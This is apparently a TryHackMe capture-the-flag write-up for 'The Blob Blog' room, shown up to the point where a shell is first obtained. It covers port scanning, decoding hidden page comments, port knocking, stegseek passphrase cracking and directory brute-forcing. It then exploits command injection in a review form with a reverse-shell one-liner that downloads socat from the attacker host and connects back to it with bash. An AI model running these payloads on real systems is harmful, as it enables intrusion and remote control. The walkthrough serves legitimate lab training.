# The Blob Blog

## Introduction

Welcome to my another writeup! In this TryHackMe [The Blob Blog](https://tryhackme.com/room/theblobblog) room, you'll learn: Enumeration, port knocking and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to bobloblaw](#privilege-escalation)**
4. **[Privilege Escalation: bobloblaw to root](#bobloblaw-to-root)**
6. **[Conclusion](#conclusion)**

## Background

> Successfully hack into bobloblaw's computer
> 
> Difficulty: Medium

---

Can you root the box?

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# export RHOSTS=10.10.35.23 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e728a633664e999e8ead2f1b49ec3ee8 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALXivx0EdFUjWn8Hg9zVrEE0+FIVsz0Dgt27TYzwHsc2NBir/vuOaG2wuM28Yu1yY5yX8QyIT7QvvtGwpZMS9wGy0x+mjSzMVgkkUpMDp2Yholkm9NH/CDhaA8zg3HxGd8/EdnHMLWszgF58xPCjUAtL3tZK09B4w/pdM0FFAF5BAAAAFQDzhIOaKK76v9eKeZNe0ZgkHVdyWQAAAIEAirSNjm02GVhgTbV6I60sZmY9nWORouyVp+Y+K0MQF+Jvxr0QQEWFeIVNbYNW0eg06VJ0JLexGNttrT/N6LPU4KBR7zIGOshLhXV847rwkUjODCt0ZeLjUv0X8o6T4ExZi92VLBylxQmk2OMgUIyeVPVbAsDAK2N0LFWHfpLTbl0AAACARqXryFKMWJQTJ1Ta5dX4bCZ20ulsATRbFuMLH1OZoA7gM2A2rijxPvK6Vp/VJt7701LhgI0dUZClMLC8q0OXaTEO3Ao6zdJb8W5snDue2TrPm12UnELgUD/NwWVqyjgYq1UgZ+71l+3fy6Q8opDILH+RYmAypIXb29dXvICjC5U=
|   2048 86fcedce46634dfdca74b65046ac330f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgOLGhQs3olTn9V7fF/VB8GkElTVbM33EOlppILeLZmIdeg0NkxZdScAjalP4AB/yiU/01Whysy6NhOeuyVfwRhCkvpoWkN1X20YI6fPdTE5TLOeR+m78IXXZlyBSj2GOqvM7tPr0BqvfpsoxkS4zXVYG4OhxZDR4/rmXA9GaSOTzGEOWj839sbW6cdos5nanQSdEhDM441+GeUfXfPh+nqasy422AEhDqFh6cDRcQw5MXR2pt+VicabIfcVjRNRCmNgpx3nbJ/u1TeNC8C40krEiH735AbPd/Bu/Hbg2hY0AR7I/2dwsZMMcQ6weRLY0bOdW8wWPTIgdWN65DVAlf
|   256 e0cc050a1b8f5ea8837dc3d2b3cf91ca (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdOqWQM/+hxmRNa9Np94ZyfIfPGqNPOMKRMQkwCUXxrEfrC6RxnuNQolldjaSZtTx4nd/qWQqcNvrFbifP942o=
|   256 80e345b255e21131efb1fe39a89065c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJCjSR4Gytw2HNoqL4fDTKnxm0d8U/16kopRnicLqWMM
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 6.6.1p1 Ubuntu
80                | Apache httpd 2.4.7 ((Ubuntu))

### HTTP on Port 80

**Adding a new hosts to `/etc/hosts`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# echo "$RHOSTS theblobblog.thm" >> /etc/hosts
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109043057.png)

A default Apache instailation page.

**View source page:**
```html
<!--
K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==
-->
[...]
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```

**Let's decode them!**

**Second encoded string:**
```
HcfP8J54AK4
```

**We can try to use [CyberChef](https://gchq.github.io/CyberChef) to decode that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109052009.png)

Found a password!

**First encoded string:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# echo 'K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytbLT4rKzxdPisuLVstPisrKys8XT4uLS1bLT4rKysrPF0+LS4tWy0+KysrPF0+LS4tLVstLS0+KzxdPi0tLitbLS0tLT4rPF0+KysrLlstPisrKzxdPisuLVstPisrKzxdPi4tWy0tLT4rKzxdPisuLS0uLS0tLS0uWy0+KysrPF0+Li0tLS0tLS0tLS0tLS4rWy0tLS0tPis8XT4uLS1bLS0tPis8XT4uLVstLS0tPis8XT4rKy4rK1stPisrKzxdPi4rKysrKysrKysrKysuLS0tLS0tLS0tLi0tLS0uKysrKysrKysrLi0tLS0tLS0tLS0uLS1bLS0tPis8XT4tLS0uK1stLS0tPis8XT4rKysuWy0+KysrPF0+Ky4rKysrKysrKysrKysrLi0tLS0tLS0tLS0uLVstLS0+KzxdPi0uKysrK1stPisrPF0+Ky4tWy0+KysrKzxdPi4tLVstPisrKys8XT4tLi0tLS0tLS0tLisrKysrKy4tLS0tLS0tLS0uLS0tLS0tLS0uLVstLS0+KzxdPi0uWy0+KysrPF0+Ky4rKysrKysrKysrKy4rKysrKysrKysrKy4tWy0+KysrPF0+LS4rWy0tLT4rPF0+KysrLi0tLS0tLS4rWy0tLS0+KzxdPisrKy4tWy0tLT4rKzxdPisuKysrLisuLS0tLS0tLS0tLS0tLisrKysrKysrLi1bKys+LS0tPF0+Ky4rKysrK1stPisrKzxdPi4tLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+LlstLS0+Kys8XT4tLS4rKysrK1stPisrKzxdPi4tLS0tLS0tLS0uWy0tLT4rPF0+LS0uKysrKytbLT4rKys8XT4uKysrKysrLi0tLS5bLS0+KysrKys8XT4rKysuK1stLS0tLT4rPF0+Ky4tLS0tLS0tLS0uKysrKy4tLS4rLi0tLS0tLS4rKysrKysrKysrKysrLisrKy4rLitbLS0tLT4rPF0+KysrLitbLT4rKys8XT4rLisrKysrKysrKysrLi4rKysuKy4rWysrPi0tLTxdPi4rK1stLS0+Kys8XT4uLlstPisrPF0+Ky5bLS0tPis8XT4rLisrKysrKysrKysrLi1bLT4rKys8XT4tLitbLS0tPis8XT4rKysuLS0tLS0tLitbLS0tLT4rPF0+KysrLi1bLS0tPisrPF0+LS0uKysrKysrKy4rKysrKysuLS0uKysrK1stPisrKzxdPi5bLS0tPis8XT4tLS0tLitbLS0tLT4rPF0+KysrLlstLT4rKys8XT4rLi0tLS0tLi0tLS0tLS0tLS0tLS4tLS1bLT4rKysrPF0+Li0tLS0tLS0tLS0tLS4tLS0uKysrKysrKysrLi1bLT4rKysrKzxdPi0uKytbLS0+KysrPF0+Li0tLS0tLS0uLS0tLS0tLS0tLS0tLi0tLVstPisrKys8XT4uLS0tLS0tLS0tLS0tLi0tLS4rKysrKysrKysuLVstPisrKysrPF0+LS4tLS0tLVstPisrPF0+LS4tLVstLS0+Kys8XT4tLg==' | base64 -d
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.
```

The decoded output is an esoteric JavaScript language called "Brainfuck"

**We can go to an [online tool](https://www.splitbrain.org/_static/ook/) to decode that:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109043450.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109043456.png)

**First decoded text:**
```
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
```

So it's clear that it's referring the "port knocking".

**To do so, we can use `knock` to knock port `1`, `3`, `5`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# knock $RHOSTS 1 3 5
```

**Then use `rustscan` again to discover new ports:**
```
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.2
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e728a633664e999e8ead2f1b49ec3ee8 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBALXivx0EdFUjWn8Hg9zVrEE0+FIVsz0Dgt27TYzwHsc2NBir/vuOaG2wuM28Yu1yY5yX8QyIT7QvvtGwpZMS9wGy0x+mjSzMVgkkUpMDp2Yholkm9NH/CDhaA8zg3HxGd8/EdnHMLWszgF58xPCjUAtL3tZK09B4w/pdM0FFAF5BAAAAFQDzhIOaKK76v9eKeZNe0ZgkHVdyWQAAAIEAirSNjm02GVhgTbV6I60sZmY9nWORouyVp+Y+K0MQF+Jvxr0QQEWFeIVNbYNW0eg06VJ0JLexGNttrT/N6LPU4KBR7zIGOshLhXV847rwkUjODCt0ZeLjUv0X8o6T4ExZi92VLBylxQmk2OMgUIyeVPVbAsDAK2N0LFWHfpLTbl0AAACARqXryFKMWJQTJ1Ta5dX4bCZ20ulsATRbFuMLH1OZoA7gM2A2rijxPvK6Vp/VJt7701LhgI0dUZClMLC8q0OXaTEO3Ao6zdJb8W5snDue2TrPm12UnELgUD/NwWVqyjgYq1UgZ+71l+3fy6Q8opDILH+RYmAypIXb29dXvICjC5U=
|   2048 86fcedce46634dfdca74b65046ac330f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDgOLGhQs3olTn9V7fF/VB8GkElTVbM33EOlppILeLZmIdeg0NkxZdScAjalP4AB/yiU/01Whysy6NhOeuyVfwRhCkvpoWkN1X20YI6fPdTE5TLOeR+m78IXXZlyBSj2GOqvM7tPr0BqvfpsoxkS4zXVYG4OhxZDR4/rmXA9GaSOTzGEOWj839sbW6cdos5nanQSdEhDM441+GeUfXfPh+nqasy422AEhDqFh6cDRcQw5MXR2pt+VicabIfcVjRNRCmNgpx3nbJ/u1TeNC8C40krEiH735AbPd/Bu/Hbg2hY0AR7I/2dwsZMMcQ6weRLY0bOdW8wWPTIgdWN65DVAlf
|   256 e0cc050a1b8f5ea8837dc3d2b3cf91ca (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdOqWQM/+hxmRNa9Np94ZyfIfPGqNPOMKRMQkwCUXxrEfrC6RxnuNQolldjaSZtTx4nd/qWQqcNvrFbifP942o=
|   256 80e345b255e21131efb1fe39a89065c5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJCjSR4Gytw2HNoqL4fDTKnxm0d8U/16kopRnicLqWMM
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
445/tcp  open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
8080/tcp open  http    syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.5.3)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 5 ports are opened:

Open Ports        | Service
------------------|------------------------
21                | vsftpd 3.0.2
22                | OpenSSH 6.6.1p1 Ubuntu
80                | Apache httpd 2.4.7 ((Ubuntu))
445               | Apache httpd 2.4.7 ((Ubuntu))
8080              | Werkzeug httpd 1.0.1 (Python 3.5.3)

### FTP on Port 21

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# ftp $RHOSTS        
Connected to 10.10.35.23.
220 (vsFTPd 3.0.2)
Name (10.10.35.23:nam): anonymous
530 Permission denied.
ftp: Login failed
ftp> ^D
221 Goodbye.
```

Not allow `anonymous` login.

**How about the `bob` user?**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# ftp $RHOSTS                                                     
Connected to 10.10.35.23.
220 (vsFTPd 3.0.2)
Name (10.10.35.23:nam): bob
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||63302|).
150 Here comes the directory listing.
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25  2020 ..
-rw-r--r--    1 1001     1001          220 Jul 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25  2020 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25  2020 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25  2020 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25  2020 ftp
```

It worked!

**Let's `wget` all his files:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# wget -r ftp://bob:{Redacted}@$RHOSTS
[...]

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# cd 10.10.35.23               
                                                                                                           
┌──(root🌸siunam)-[~/…/thm/ctf/The-Blob-Blog/10.10.35.23]
└─# ls -lah
total 36K
drwxr-xr-x 3 root root 4.0K Jan  9 05:22 .
drwxr-xr-x 4 root root 4.0K Jan  9 05:22 ..
-rw-r--r-- 1 root root  220 Jul 25  2020 .bash_logout
-rw-r--r-- 1 root root 3.7K Jul 25  2020 .bashrc
-rw-r--r-- 1 root root 8.8K Jul 25  2020 examples.desktop
drwxr-xr-x 3 root root 4.0K Jan  9 05:22 ftp
-rw-r--r-- 1 root root  675 Jul 25  2020 .profile

┌──(root🌸siunam)-[~/…/thm/ctf/The-Blob-Blog/10.10.35.23]
└─# ls -lah ftp/files
total 16K
drwxr-xr-x 2 root root 4.0K Jan  9 05:22 .
drwxr-xr-x 3 root root 4.0K Jan  9 05:22 ..
-rw-r--r-- 1 root root 8.0K Jul 28  2020 cool.jpeg
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109052331.png)

**Let's use `steghide` to extract hidden stuff inside it:**
```
┌──(root🌸siunam)-[~/…/thm/ctf/The-Blob-Blog/10.10.35.23]
└─# steghide extract -sf ftp/files/cool.jpeg
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```

**Hmm... Let's use `stegseek` to crack the passphrase:**
```
┌──(root🌸siunam)-[~/…/thm/ctf/The-Blob-Blog/10.10.35.23]
└─# stegseek --crack ftp/files/cool.jpeg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "{Redacted}"       
[i] Original filename: "out.txt".
[i] Extracting to "cool.jpeg.out".
```

Found it!

**`cool.jpeg.out`:**
```
┌──(root🌸siunam)-[~/…/thm/ctf/The-Blob-Blog/10.10.35.23]
└─# cat cool.jpeg.out 
zcv:{Redacted}
/bobs_safe_for_stuff
```

Looks like it's a credentials `zcv:{Redacted}`, and a hidden directory `/bobs_safe_for_stuff`?

### HTTP on Port 445

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109044003.png)

**View source page:**
```html
<!--
Bob, I swear to goodness, if you can't remember {Redacted} 
It's not that hard
-->
```

We've cracked that password in `stegseek`.

**`/bobs_safe_for_stuff`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# curl http://theblobblog.thm:445/bobs_safe_for_stuff   
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- {Redacted}
```

Blog?

**In the meantime, I'll use `gobuster` to enumerate hidden directories and files:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# gobuster dir -u http://theblobblog.thm:445/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
/index.html           (Status: 200) [Size: 11596]
/.htaccess            (Status: 403) [Size: 292]
/.                    (Status: 200) [Size: 11596]
[...]

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# gobuster dir -u http://theblobblog.thm:445/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100 
[...]
/user                 (Status: 200) [Size: 3401]
```

- Found hidden directory: `/user`

**`/user`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# curl http://theblobblog.thm:445/user
-----BEGIN OPENSSH PRIVATE KEY-----
KSHyMzjjE7pZPFLIWrUdNridNrips0Gtj2Yxm2RhDIkiAxtniSDwgPRkjLMRFhY=
{Redacted}
q3GwjcSkiR1wKFzyorTFLIPFMO5kgxCPFLITgx9cOVLIPFLIPFLJPFLKUbLIPFohr2lekc
-----END OPENSSH PRIVATE KEY-----
```

**It's a private SSH key? Let's `wget` it for later use:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# wget http://theblobblog.thm:445/user

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# chmod 600 user
```

### HTTP on Port 8080

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109044142.png)

Nothing weird in view source page.

**Again, enumerate hidden directories and files via `gobuster`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# gobuster dir -u http://theblobblog.thm:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 100
[...]
/blog                 (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]
/login                (Status: 200) [Size: 546]
/review               (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]
/blog2                (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]
/blog1                (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]
/blog3                (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]
/blog4                (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]
/blog5                (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]
/blog6                (Status: 302) [Size: 219] [--> http://theblobblog.thm:8080/login]

┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# gobuster dir -u http://theblobblog.thm:8080/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100
[...]
```

- Found directory: `/blog`, `/login`, `/review`, `/blog1-6`

**`/login`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109044801.png)

In here, we can try to guess the credentials, like `admin:admin`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109051834.png)

Nope.

## Initial Foothold

**After banging my head against the wall, I realize that the `zcv:{Redacted}` is a vigenere encoded text:**

Let's decode that with a key that we've found in the `/bobs_safe_for_stuff` directory:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054032.png)

We successfully decoded that!

**Let's try to login as `bob`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054106.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054111.png)

Nice!

`/review`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054132.png)

`/blog1`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054146.png)

`/blog2`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054200.png)

`/blog3`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054216.png)

`/blog4`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054230.png)

`/blog5`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054239.png)

`/blog6`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054250.png)

Nothing weird.

**In `/blog`, we can submit a review. Let's try it:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054332.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054356.png)

Our input is being outputed to `/review`.

**Now, we can try to test SQL injection, XSS, CSTI/SSTI:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054829.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054836.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109054841.png)

Looks like there is no filter at all, and the XSS payload worked.

**After poking around, I found that we can execute any OS commands:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109055522.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109055527.png)

That being said, let's get a reverse shell!

- Setup a listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443 
2023/01/09 05:56:02 socat[58349] N opening character device "/dev/pts/1" for reading and writing
2023/01/09 05:56:02 socat[58349] N listening on AF=2 0.0.0.0:443

┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Send the payload: (Generated from [revshells.com](https://www.revshells.com/))

```bash
wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/The-Blob-Blog/images/Pasted%20image%2020230109055828.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/The-Blob-Blog]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443 
2023/01/09 05:56:02 socat[58349] N opening character device "/dev/pts/1" for reading and writing
2023/01/09 05:56:02 socat[58349] N listening on AF=2 0.0.0.0:443
                                                                2023/01/09 05:57:04 socat[58349] N accepting connection from AF=2 10.10.35.23:59532 on AF=2 10.9.0.253:443
                                                               2023/01/09 05:57:04 socat[58349] N starting data transfer loop with FDs [5,5] and [7,7]
                                           www-data@bobloblaw-VirtualBox:~/html2$ 
www-data@bobloblaw-VirtualBox:~/html2$ export TERM=xterm-256color
www-data@bobloblaw-VirtualBox:~/html2$ stty rows 22 columns 107
www-data@bobloblaw-VirtualBox:~/html2$ whoami;hostname;id;ip a
www-data
bobloblaw-VirtualBox
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
